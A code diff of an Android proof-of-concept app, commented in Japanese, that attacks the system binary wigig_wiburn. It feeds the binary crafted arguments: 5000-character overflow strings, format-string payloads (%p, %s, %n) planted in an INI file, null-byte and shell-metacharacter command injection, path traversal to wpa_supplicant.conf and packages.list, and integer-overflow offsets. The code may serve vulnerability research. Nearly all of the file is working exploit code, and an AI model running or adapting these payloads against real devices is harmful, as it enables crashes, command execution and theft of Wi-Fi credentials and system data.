@@ -1,11 +1,14 @@
 package com.wigig.poc;
 
 import android.os.Bundle;
+import android.os.Environment;
 import androidx.appcompat.app.AppCompatActivity;
 import android.view.View;
 import android.widget.TextView;
 
 import java.io.BufferedReader;
+import java.io.File;
+import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStreamReader;
 
@@ -14,7 +17,6 @@ public class MainActivity extends AppCompatActivity {
     private TextView tvOutput;
     private final StringBuilder log = new StringBuilder();
 
-    // JNIは補助的に使用（今回はバイナリ実行のトリガーが主目的）
     static {
         System.loadLibrary("wigig_poc");
     }
@@ -28,7 +30,8 @@ public class MainActivity extends AppCompatActivity {
 
         findViewById(R.id.btn_null_test).setOnClickListener(v -> testNullPointer());
         findViewById(R.id.btn_overflow).setOnClickListener(v -> testBufferOverflow());
-        findViewById(R.id.btn_injection).setOnClickListener(v -> testCommandInjection());
+        findViewById(R.id.btn_format_string).setOnClickListener(v -> testFormatStringViaIni());
+        findViewById(R.id.btn_null_byte).setOnClickListener(v -> testNullByteInjection());
         findViewById(R.id.btn_path_traversal).setOnClickListener(v -> testPathTraversal());
         findViewById(R.id.btn_int_overflow).setOnClickListener(v -> testIntOverflow());
     }
@@ -38,14 +41,11 @@ public class MainActivity extends AppCompatActivity {
         tvOutput.setText(log.toString());
     }
 
-    // 1. NULLポインタ参照（-burnのみ指定で必須パラメータ欠落）
+    // 1. NULL ポインタ参照 (DoS) - 前回と同じ
     private void testNullPointer() {
         append("=== 1. NULLポインタ参照 (DoS) ===");
-        // ログのクラッシュを再現: -burn のみ
         exec("/system/bin/wigig_wiburn", "-burn");
-        // -device のみ指定（-burn なし）
         exec("/system/bin/wigig_wiburn", "-device", "SPARROW");
-        // 空の -fw
         exec("/system/bin/wigig_wiburn", "-burn", "-fw", "");
     }
 
@@ -53,47 +53,63 @@ public class MainActivity extends AppCompatActivity {
     private void testBufferOverflow() {
         append("=== 2. バッファオーバーフロー (5000文字) ===");
         String longStr = new String(new char[5000]).replace('\0', 'A');
-        // -device に長大文字列を渡す (ログのクラッシュを再現)
         exec("/system/bin/wigig_wiburn", "-device", longStr, "-burn");
-        // -interface にも
         exec("/system/bin/wigig_wiburn", "-interface", longStr, "-device", "SPARROW");
-        // -fw にも
-        exec("/system/bin/wigig_wiburn", "-fw", longStr, "-device", "SPARROW");
     }
 
-    // 3. コマンドインジェクション（シェルメタ文字）
-    private void testCommandInjection() {
-        append("=== 3. コマンドインジェクション ===");
-        // セミコロンで ls を実行
-        exec("/system/bin/wigig_wiburn", "-device", "SPARROW; ls -l /data/", "-burn");
-        // パイプで id
-        exec("/system/bin/wigig_wiburn", "-device", "SPARROW| id", "-burn");
-        // バッククォート
-        exec("/system/bin/wigig_wiburn", "-device", "SPARROW`ls`", "-burn");
-        // 改行コード
-        exec("/system/bin/wigig_wiburn", "-device", "SPARROW\nid", "-burn");
+    // 3. ★フォーマット文字列攻撃（INIファイル経由）
+    private void testFormatStringViaIni() {
+        append("=== 3. フォーマット文字列攻撃 (INI経由) ===");
+        try {
+            File sdcard = Environment.getExternalStorageDirectory();
+            File iniFile = new File(sdcard, "poc_fw.ini");
+            String iniContent = 
+                "[DummySection]\n" +
+                "key1 = %p%p%p%p%p%p\n" +
+                "key2 = %s%s%s\n" +
+                "key3 = %n"; // %n は書き込みを試みる（クラッシュ誘発）
+            FileOutputStream fos = new FileOutputStream(iniFile);
+            fos.write(iniContent.getBytes());
+            fos.close();
+            append("INIファイル作成: " + iniFile.getAbsolutePath());
+            exec("/system/bin/wigig_wiburn", "-fw", iniFile.getAbsolutePath(), "-device", "SPARROW");
+        } catch (IOException e) {
+            append("INI作成失敗: " + e.getMessage());
+        }
     }
 
-    // 4. パストラバーサル
+    // 4. ★Nullバイトインジェクション
+    private void testNullByteInjection() {
+        append("=== 4. Nullバイトインジェクション ===");
+        // \0 を含む文字列（Javaでは \0 でヌル文字を表現）
+        String payload = "SPARROW\0; ls /data/";
+        exec("/system/bin/wigig_wiburn", "-device", payload, "-burn");
+        // ファイル名にも仕込む
+        String filePayload = "/sdcard/poc\0.ini";
+        exec("/system/bin/wigig_wiburn", "-fw", filePayload, "-device", "SPARROW");
+    }
+
+    // 5. パストラバーサル（拡張）
     private void testPathTraversal() {
-        append("=== 4. パストラバーサル ===");
-        // システムファイルを指定
-        exec("/system/bin/wigig_wiburn", "-fw", "../../../system/etc/hosts", "-device", "SPARROW");
-        exec("/system/bin/wigig_wiburn", "-ids", "../../../data/misc/wifi/wpa_supplicant.conf", "-device", "SPARROW");
-        // 絶対パスで/etc/passwd
-        exec("/system/bin/wigig_wiburn", "-setup_ini", "/data/local/tmp/../../../../etc/passwd", "-device", "SPARROW");
+        append("=== 5. パストラバーサル (拡張) ===");
+        String[] targets = {
+            "../../../system/etc/hosts",
+            "../../../data/misc/wifi/wpa_supplicant.conf",
+            "../../../data/system/packages.list",
+            "../../../proc/self/cmdline"
+        };
+        for (String t : targets) {
+            exec("/system/bin/wigig_wiburn", "-fw", t, "-device", "SPARROW");
+        }
     }
 
-    // 5. 整数オーバーフロー
+    // 6. 整数オーバーフロー（メモリ割り当て狙い）
     private void testIntOverflow() {
-        append("=== 5. 整数オーバーフロー ===");
-        // 最大値を超える値
+        append("=== 6. 整数オーバーフロー (メモリ) ===");
         exec("/system/bin/wigig_wiburn", "-read", "-offset", "0xFFFFFFFFFFFFFFFF", "-length", "0x80000000", "-device", "SPARROW");
-        // 負の値（strtoull は符号なし変換のため、意図しない大きな値になる）
-        exec("/system/bin/wigig_wiburn", "-burn", "-offset", "-1", "-length", "1", "-device", "SPARROW");
+        exec("/system/bin/wigig_wiburn", "-burn", "-offset", "-1", "-length", "0xFFFFFFFF", "-device", "SPARROW");
     }
 
-    // コマンド実行ユーティリティ
     private void exec(String... cmd) {
         try {
             ProcessBuilder pb = new ProcessBuilder(cmd);
@@ -102,12 +118,12 @@ public class MainActivity extends AppCompatActivity {
             BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
             String line;
             while ((line = r.readLine()) != null) {
-                append("[stdout] " + line);
+                append("[out] " + line);
             }
             int code = p.waitFor();
             append("終了コード: " + code);
-        } catch (IOException | InterruptedException e) {
-            append("実行例外: " + e.getMessage());
+        } catch (Exception e) {
+            append("例外: " + e.getMessage());
         }
     }
 }
